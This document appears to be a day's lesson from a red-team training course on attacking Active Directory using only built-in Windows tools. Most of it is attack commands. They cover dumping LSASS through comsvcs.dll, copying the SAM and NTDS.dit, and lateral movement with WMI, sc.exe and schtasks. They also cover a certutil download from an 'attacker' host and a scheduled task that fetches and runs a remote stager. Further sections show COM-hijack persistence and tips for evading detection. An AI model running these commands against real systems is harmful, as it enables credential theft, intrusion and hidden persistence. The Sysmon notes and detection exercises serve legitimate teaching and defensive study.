---
title: "Living-Off-The-Land in AD — Native Windows Tools for the Full Kill-Chain"
tags: [red-team, LOLAD, LOLBins, living-off-the-land, native-tools, PowerShell,
  WMIC, certutil, nltest, ATT&CK, T1059.001, T1218]
module: 08-RedTeam-03
day: 518
related_topics:
  - AdminSDHolder and DCShadow (Day 517)
  - Advanced Evasion and AV Bypass (Day 519)
  - AV and EDR Evasion Concepts (Day 494)
  - Post-Exploitation Advanced (Day 497)
---

# Day 518 — Living-Off-The-Land in AD

> "The best detection rule catches tools. The attacker who does not bring
> tools does not trigger tool-based rules. Every technique in this module
> uses a binary that is already on the machine, signed by Microsoft, and
> has a legitimate reason to exist. That is the constraint. Work within it."
>
> — Ghost

---

## Goals

Execute a complete AD attack chain using only native Windows binaries and
built-in PowerShell.
Understand which LOLBins generate which Sysmon events.
Compare native tool noise versus external tool noise for each attack phase.
Identify the detection gaps that LOLBins create versus custom or open-source tools.

**Prerequisites:** Day 497 (post-exploitation), Days 494–496 (evasion), AD
attack knowledge from Days 499–517.
**Time budget:** 5 hours.

---

## Part 1 — The LOLAD Constraint

```
Constraint: no binary that is not already installed on a standard Windows
Server or Windows 10/11 workstation (no Mimikatz, no Rubeus, no SharpHound).

Available:
  PowerShell (5.1, 7.x)
  CMD.EXE
  WMIC.EXE (deprecated but present on older Windows)
  Certutil.EXE
  Nltest.EXE
  Net.EXE / Net1.EXE
  REG.EXE
  SC.EXE
  SCHTASKS.EXE
  Dsquery.EXE / Dsget.EXE
  Whoami.EXE
  Nslookup.EXE
  Netsh.EXE
  MSHTA.EXE / WSCRIPT.EXE / CSCRIPT.EXE
  Rundll32.EXE
  Regsvr32.EXE

The challenge: accomplish the full kill-chain with only what is already there.
```

---

## Part 2 — Situational Awareness (LOLAD)

```powershell
# Identity:
whoami /all
# → Includes: username, SID, all group memberships, privileges

# System info:
hostname
systeminfo | findstr /i "domain\|os"

# Network:
ipconfig /all
route print
arp -a

# Active sessions:
query user        # currently logged-in users
query session     # terminal services sessions
net session       # inbound NetBIOS sessions (requires admin)

# Domain info — all native:
nltest /dclist:corp.local         # Domain Controller list
nltest /domain_trusts /all_trusts # All domain trusts
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local  # DC SRV records

# Domain user enumeration (no LDAP library needed):
net user /domain                  # all domain users (paginated)
net group /domain                 # all domain groups
net group "Domain Admins" /domain # DA members
net group "Domain Computers" /domain

# Current user group check:
net user %USERNAME% /domain       # current user's group memberships
whoami /groups | findstr "Admin"  # filter for admin groups

# Process listing:
tasklist /v                       # all processes with user context
tasklist /svc                     # processes with associated services
```

---

## Part 3 — AD Enumeration via LDAP (Pure PowerShell, No Tools)

```powershell
# All AD queries below use .NET System.DirectoryServices — no external modules

# Find Kerberoastable accounts (accounts with SPNs):
$searcher = [ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","admincount"))
$searcher.FindAll() | ForEach-Object {
    "$($_.Properties['samaccountname']) | SPN: $($_.Properties['serviceprincipalname'])"
}

# Find accounts with DoesNotRequirePreAuth (AS-REP roastable):
$searcher = [ADSISearcher]"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] }

# Find computers with unconstrained delegation:
$searcher = [ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$searcher.FindAll() | ForEach-Object { $_.Properties['name'] }

# Find accounts with adminCount=1 (protected by AdminSDHolder):
$searcher = [ADSISearcher]"(&(objectCategory=user)(admincount=1))"
$searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] }

# Find all GPOs:
$searcher = [ADSISearcher]"(objectCategory=groupPolicyContainer)"
$searcher.PropertiesToLoad.Add("displayName") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties['displayName'] }

# Find Domain Controllers:
$searcher = [ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
$searcher.FindAll() | ForEach-Object { $_.Properties['name'] }
```

---

## Part 4 — Credential Access (LOLAD)

```powershell
# LSASS dump via comsvcs.dll (Windows built-in DLL — no external binary):
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll,
    MiniDump $lsassPid C:\Windows\Temp\ls.dmp full
# → LSASS dump using a signed Windows DLL
# Sysmon Event 10 fires; but no Mimikatz/Rubeus signature on disk

# SAM database dump (local accounts, no domain):
reg save HKLM\SAM C:\Windows\Temp\sam.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y
# Copy to attacker machine → secretsdump.py -sam sam.hive -system system.hive LOCAL

# NTDS.dit via Volume Shadow Copy (requires admin):
# Use diskshadow (a signed Windows binary):
$shadowScript = @"
set context persistent nowriters
add volume C: alias shadow1
create
expose %shadow1% Z:
"@
$shadowScript | Out-File C:\Windows\Temp\shadow.txt -Encoding ASCII
diskshadow /s C:\Windows\Temp\shadow.txt

# Copy NTDS.dit from the shadow:
robocopy /b Z:\Windows\NTDS C:\Windows\Temp\ntds\ NTDS.dit
reg save HKLM\SYSTEM C:\Windows\Temp\ntds\SYSTEM /y
# Transfer and parse: secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL

# Credential Manager (Windows Credential Manager — plaintext passwords):
cmdkey /list                          # list stored credentials
# For each entry: vaultcmd /listschema  (inspect vault content)
```

---

## Part 5 — Lateral Movement (LOLAD)

```powershell
# WMI remote process creation (built into Windows):
$target = "WORKSTATION02.corp.local"
$cred = Get-Credential  # or pass NTLM hash via invoke-command with -credential
Invoke-WmiMethod -Class Win32_Process -Name Create `
    -ArgumentList "C:\Windows\Temp\payload.exe" `
    -ComputerName $target -Credential $cred

# PsExec equivalent using native SC.EXE:
sc.exe \\WORKSTATION02 create svc123 binpath= "C:\Windows\Temp\payload.exe"
sc.exe \\WORKSTATION02 start svc123
sc.exe \\WORKSTATION02 delete svc123   # cleanup

# Remote scheduled task (native schtasks):
schtasks /create /s WORKSTATION02 /tn "WinUpdate" /tr "C:\Windows\Temp\payload.exe" `
    /sc ONCE /st 23:59 /ru SYSTEM /f /u corp\Administrator /p Password123
schtasks /run /s WORKSTATION02 /tn "WinUpdate"
schtasks /delete /s WORKSTATION02 /tn "WinUpdate" /f

# PowerShell remoting (if WinRM is enabled):
Invoke-Command -ComputerName WORKSTATION02 -Credential $cred `
    -ScriptBlock { hostname; whoami }

# Certutil for file transfer (LOLBin file download):
certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\payload.exe
# Certutil is a trusted Windows binary; less suspicious than Invoke-WebRequest
# Sysmon Event 3: outbound HTTP from certutil.exe — watch for non-Microsoft URLs

# Netsh port proxy (for tunnelling/pivoting without tools):
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
    connectport=445 connectaddress=10.10.10.5
# Forwards port 8080 on compromised host to DC:445
# Provides a tunnel without any external proxy binary
```

---

## Part 6 — Persistence (LOLAD)

```powershell
# Registry Run key (reg.exe — built-in):
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    /v "WindowsDefenderHelper" /t REG_SZ `
    /d "C:\Users\jsmith\AppData\Roaming\wdh.exe" /f

# Scheduled task (schtasks — built-in):
schtasks /create /tn "Microsoft\Windows\Shell\Defrag" `
    /tr "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/stager.ps1')" `
    /sc DAILY /st 08:00 /ru SYSTEM /f

# WMI event subscription (PowerShell — built-in .NET classes):
# (See Day 497 Part 5 for full WMI subscription via PowerShell)

# COM hijacking (no external tools):
# Identify a COM class that is called by a common application but missing HKCU registration:
# Check: HKLM\SOFTWARE\Classes\CLSID\{CLSID} → exists in HKLM but not HKCU
# Add HKCU registration pointing to attacker DLL:
reg add "HKCU\SOFTWARE\Classes\CLSID\{GUID}\InProcServer32" `
    /ve /t REG_SZ /d "C:\Users\jsmith\AppData\Local\evil.dll" /f
# When the target application loads this COM class, it loads evil.dll instead
# → DLL execution in the context of a trusted process, no admin required
```

---

## Part 7 — Noise Comparison: LOLBins vs External Tools

| Phase | External Tool | LOLBin Alternative | Detection delta |
|---|---|---|---|
| AD enumeration | SharpHound | PowerShell ADSI | Event 1 (SharpHound) → Event 4 (powershell.exe only) |
| LSASS dump | Mimikatz sekurlsa | comsvcs.dll MiniDump | Both fire Event 10; no mimikatz.exe signature |
| NTDS.dit | ntdsutil | diskshadow + robocopy | Both access NTDS; diskshadow is a signed binary |
| Lateral movement | PsExec | sc.exe + schtasks | Both create remote services; identical Event 7045 |
| File transfer | custom dropper | certutil -urlcache | Certutil LOLBin rule triggers; dropper may not |
| Port forwarding | Ligolo/chisel | netsh portproxy | No external binary; netsh changes are audited |

---

## Key Takeaways

1. LOLBins do not eliminate detection — they shift the detection surface from
   tool signatures to behaviour patterns. A defender who monitors `WmiPrvSE.exe`
   spawning children, `certutil.exe` making outbound HTTP requests, and
   `diskshadow.exe` being run interactively will catch LOLBin abuse.
2. Pure PowerShell ADSI queries generate only `powershell.exe` process events —
   no network connection to the DC (LDAP traffic is not captured by most Sysmon
   configs). This makes ADSI-based enumeration significantly quieter than
   SharpHound's SMB session sweep.
3. Certutil is one of the noisiest LOLBins because it is commonly abused and
   most mature Sysmon configs have Event 3 (network) from certutil flagged.
   Use `Invoke-WebRequest` with a `UserAgent` matching a browser as an alternative.
4. `diskshadow.exe` executing from an interactive session (not a backup process)
   is a strong signal. In production, backup agents run it as SYSTEM from
   scheduled tasks — not from a user session or beacon.
5. The goal of LOLAD is not to be undetectable — it is to raise the detection
   complexity to a level that requires a mature, tuned SIEM to catch. Most
   environments are not at that level. Know where your target is on that spectrum.

---

## Exercises

1. Complete the full kill-chain using ONLY native Windows tools: enumerate AD,
   dump LSASS via comsvcs.dll, enumerate domain admins, execute WMI lateral
   movement, and create a scheduled task persistence mechanism. No Mimikatz,
   no Rubeus, no SharpHound.
2. Compare Sysmon event logs for: (a) SharpHound C All vs. PowerShell ADSI
   enumeration, and (b) Mimikatz sekurlsa vs. comsvcs.dll MiniDump. List every
   event that appears in (a) but not in (b) for each comparison.
3. Use `certutil -urlcache` to download a file in the lab. Write a Sigma rule
   that detects `certutil.exe` making outbound HTTP/HTTPS connections
   (Sysmon Event 3 with certutil as the Image).
4. Implement COM hijacking for a specific CLSID that is loaded by `mmc.exe`
   (Microsoft Management Console). Verify your DLL executes when mmc.exe starts.
   Note the Sysmon event generated (Event 7: Image Load).

---

## Questions

> Add your questions here. Each question gets a Global ID (Q518.1, Q518.2 …).

---

## Navigation

← Previous: [Day 517 — AdminSDHolder and DCShadow](DAY-0517-AdminSDHolder-DCShadow.md)
→ Next: [Day 519 — Advanced Evasion and AV Bypass](DAY-0519-Advanced-Evasion-AV-Bypass.md)
